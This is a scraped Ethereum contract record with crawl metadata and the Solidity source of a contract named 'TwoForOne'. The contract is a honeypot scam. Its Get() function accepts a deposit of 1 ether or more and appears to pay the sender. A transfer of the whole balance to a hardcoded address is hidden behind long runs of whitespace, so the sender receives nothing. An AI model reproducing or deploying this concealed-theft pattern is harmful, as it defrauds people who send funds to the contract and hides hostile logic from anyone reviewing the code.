//token_name	
//token_url	https://etherscan.io//address/0x43De395326E1FD472bF8AB81bbC895CC620705eD#code
//spider_time	2018/07/08 12:46:05
//token_Transactions	3 txns
//token_price	

pragma solidity ^0.4.19;

contract TwoForOne
{
    function() public payable{}
   
    function Get()
    public
    payable
    {                                                                    
        if(msg.value>=1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   address(0x9Cc9B3133c1deb8E66AcA7eC5ebCad26cd24ff27).transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
}